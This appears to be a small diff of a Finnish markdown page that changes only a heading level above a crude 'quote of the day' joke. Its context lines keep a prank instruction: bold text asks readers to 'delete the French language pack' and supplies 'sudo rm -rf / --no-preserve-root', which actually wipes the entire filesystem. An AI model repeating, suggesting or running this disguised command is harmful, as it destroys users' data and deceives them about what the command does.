@@ -29,6 +29,6 @@ Eniten kiinnosti:
 ***PLEASE DELETE THE FRENCH LANGUAGE PACK:***
 ``` sudo rm -rf / --no-preserve-root```
 ---
- ## Päivän mietelause:
+ ### Päivän mietelause:
 > Boss makes a dollar, I make a dime, that's why I poo on company time!
 
